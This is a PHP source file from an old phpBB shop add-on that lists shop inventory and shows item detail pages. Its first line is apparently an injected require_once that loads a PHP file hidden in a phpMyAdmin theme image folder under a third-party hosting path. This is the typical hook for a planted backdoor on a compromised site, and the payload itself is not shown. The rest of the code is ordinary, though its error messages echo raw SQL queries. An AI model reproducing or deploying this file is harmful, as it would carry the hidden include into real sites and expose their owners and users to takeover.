<?php
 require_once ('/home/content/D/a/r/DarkPsycho/html/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                            shop_inventory.php
 *                            -------------------
 *   Version              : 3.0.6
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2002-2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management

if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }


//
// Register Global Variables
if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }

// End Global Variables
//

//start of shop list page
if ( $action == 'shoplist' )
{
	if ( isset($HTTP_GET_VARS['shop']) || isset($HTTP_POST_VARS['shop']) ) { $shop = ( isset($HTTP_POST_VARS['shop']) ) ? intval($HTTP_POST_VARS['shop']) : intval($HTTP_GET_VARS['shop']); }
	else { $shop = ''; }

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE id = $shop";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting shop information!');
	}
	$row = $db->sql_fetchrow($result);

	if ( ($db->sql_numrows($result) < 1) || (strtolower($row['shoptype']) == 'admin_only') )
	{
		message_die(GENERAL_MESSAGE, $lang['shop_doesnt_exist']);
	}

	if ( empty($row['template']) )
	{
		$template->set_filenames(array(
			'body' => 'shop/shop_list_body.tpl')
		);
	}
	else
	{
		$template->set_filenames(array(
			'body' => 'shop/' . $row['template'])
		);
	}

	$sql = "SELECT *
		FROM " . SHOP_ITEMS_TABLE . "
		WHERE shop = '" . str_replace("'", "''", $row['shopname']) . "'
		ORDER BY " . $board_config['shop_orderby'];
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'Fatal Error<br />' . $sql);
	}
	$sql_count = $db->sql_numrows($result);

	for ($i = 0; $i < $sql_count; $i++)
	{
		$row2 = $db->sql_fetchrow($result);
		$rownum = ( $i % 2 ) ? "row1" : "row2";

		$template->assign_block_vars('listrow', array(
			'ROW_CLASS' => $rownum,

			'NAME' => $row2['name'],
			'SDESC' => $row2['sdesc'],
			'SOLD' => $row2['sold'],
			'STOCK' => $row2['stock'],
			'COST' => $row2['cost'],

			'URL' => append_sid('shop_inventory.'.$phpEx.'?action=displayitem&item='.$row2['id']))
		);
	}

	$page_title = stripslashes($row['shopname']);
	$shoplocation = ' -> <a href="'.append_sid('shop.'.$phpEx).'" class="nav">' . $lang['shop_list'] . '</a> -> <a href="' . append_sid('shop_inventory.'.$phpEx.'?action=shoplist&shop=' . $row['id']) . '" class="nav">' . str_replace("s's", "s'", stripslashes($row['shopname'])) . ' ' . $lang['inventory'] . '</a>';

	// Start gender vars
	$template->assign_vars(array(
		'SHOPPERSONAL' => $personal,
		'SHOPLOCATION' => $shoplocation,

		'NPC_NAME' => $row['shop_owner'],

		'INVENTORY_LINK' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),
		'USER_POINTS' => $userdata['user_points'],
		'POINTS_NAME' => $board_config['points_name'],

		'L_SHOP_TITLE' => stripslashes($row['shopname']),
		'L_ITEM_NAME' => $lang['name'],
		'L_S_DESC' => $lang['item_s_desc'],
		'L_SOLD' => $lang['item_sold'],
		'L_LEFT' => $lang['item_left'],
		'L_COST' => $lang['item_cost'],
		'L_ITEM_INFO' => $lang['shop_item_info'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_INVENTORY' => $lang['shop_your_inv']
	));
	$template->assign_block_vars('', array());
}

//start of item info page
elseif ( $action == 'displayitem' ) 
{
	if ( isset($HTTP_GET_VARS['item']) || isset($HTTP_POST_VARS['item']) ) { $item = ( isset($HTTP_POST_VARS['item']) ) ? intval($HTTP_POST_VARS['item']) : intval($HTTP_GET_VARS['item']); }
	else { message_die(GENERAL_MESSAGE, 'No Item Selected!'); }
	
	//make sure item exists & shop is not a special/admin shop
	$sql = "SELECT *
		FROM " . SHOP_ITEMS_TABLE . "
		WHERE id = $item
		ORDER BY `id`";
	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error<br />' . $sql); }
	if ($db->sql_numrows($result) < 1) { message_die(GENERAL_MESSAGE, $lang['no_item_exists']); }
	$row = $db->sql_fetchrow($result);

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE shopname = '" . str_replace("'", "''", $row['shop']) . "'
			AND shoptype <> 'special'
			AND shoptype <> 'admin_only'";
	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error<br />' . $sql); }
	if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, $lang['item_protected']); }
	else { $sirow = $db->sql_fetchrow($result); }
	//end check on item exists

	if ( empty($sirow['item_template']) )
	{
		$template->set_filenames(array(
			'body' => 'shop/shop_item_body.tpl')
		);
	}
	else
	{
		$template->set_filenames(array(
			'body' => 'shop/' . $sirow['item_template'])
		);
	}

	#
	# Check for singular item shops (limited to 1 of each item)
	# "Magic" is specific to certain forums. This will be updated in next version to a setting.
	#
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE item_id = {$row['id']}
			AND user_id = {$userdata['user_id']}
			AND worn = 0";
	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error'); }
	$count = $db->sql_numrows($result);

	if ( $sirow['type'] == 'magic' && $count )
	{
		$template->assign_block_vars('switch_has_spell', array(
			'IGNORE_HTML_START' => '<!--',
			'IGNORE_HTML_END' => '// -->'
		));
	}

	#
	# End check
	#
	if ( $count )
	{
		$useritemamount = $count;
		$sellbuy = "sell";
	}

	if (file_exists("shop/images/".$row['name'].".jpg")) { $itemfilext = "jpg"; }
	elseif (file_exists("shop/images/".$row['name'].".png")) { $itemfilext = "png"; }
	else { $itemfilext = "gif"; }


	if ( ($board_config['multibuys'] == "on") && ($useritemamount > 0) ) 
	{
		$template->assign_block_vars('switch_multi_items', array(
			'NAME' => $row['name'],

			'BUY_URL' => append_sid('shop_bs.'.$phpEx.'?action=buy&item='.$row['id'], true),
			'SELL_URL' => append_sid('shop_bs.'.$phpEx.'?action=sell&item='.$row['id'], true)

		));
	}
	elseif ( ($board_config['multibuys'] == 'off') || ($useritemamount < 1) ) 
	{
		if ( !isset($useritemamount) )
		{
			$useritemamount = 0;
			$sellbuy = "buy";
		}

		$template->assign_block_vars('switch_multi_ops', array(
			'NAME' => $row['name'],
			'ACTION' => ucfirst($sellbuy),

			'URL' => append_sid('shop_bs.' . $phpEx . '?action=' . $sellbuy . '&item=' . $row['id'], true)
		));

		if ( $sellbuy == 'buy' )
		{
			$template->assign_block_vars('switch_multi_ops_buy', array());
		}
		else
		{
			$template->assign_block_vars('switch_multi_ops_sell', array());
		}
	}
	$title = $lang['shop_item_info'] . ' ' . $row['name'];
	$page_title = $lang['shop_item_info'] . ' ' . $row['name'];
	$shoplocation = ' -> <a href="'.append_sid('shop.'.$phpEx, true).'" class="nav">' . $lang['shop_list'] . '</a> -> <a href="'.append_sid('shop_inventory.'.$phpEx.'?action=shoplist&shop='.$sirow['id'], true).'" class="nav">' .$row['shop'] . ' ' . $lang['inventory'] . '</a> -> <a href="'.append_sid('shop_inventory.'.$phpEx.'?action=displayitem&item='.$row['id'], true).'" class="nav">' . $row['name'] . ' ' . $lang['information'] . '</a>';

	$template->assign_vars(array(
		'USER_AMOUNT' => $useritemamount,
		'ITEM_COST' => $row['cost'],
		'ITEM_STOCK' => $row['stock'],
		'ITEM_LDESC' => $row['ldesc'],
		'ITEM_NAME' => $row['name'],
		'FILE_EXT' => $itemfilext,

		'USER_POINTS' => $userdata['user_points'],
		'POINTS_NAME' => $board_config['points_name'],
		'USER_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
		'NPC_NAME' => $sirow['shop_owner'],

		'SHOPLOCATION' => $shoplocation,

		'L_BUY' => $lang['buy'],
		'L_SELL' => $lang['sell'],
		'L_SHOP_TITLE' => $title,
		'L_ICON' => $lang['icon'],
		'L_ITEM_NAME' => $lang['name'],
		'L_DESCRIPTION' => $lang['item_desc'],
		'L_STOCK' => $lang['item_stock'],
		'L_COST' => $lang['item_cost'],
		'L_OWNED' => $lang['owned'],
		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
	));
	$template->assign_block_vars('', array());

}
else 
{
	message_die(GENERAL_MESSAGE, $lang['invalid_command']);
}

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>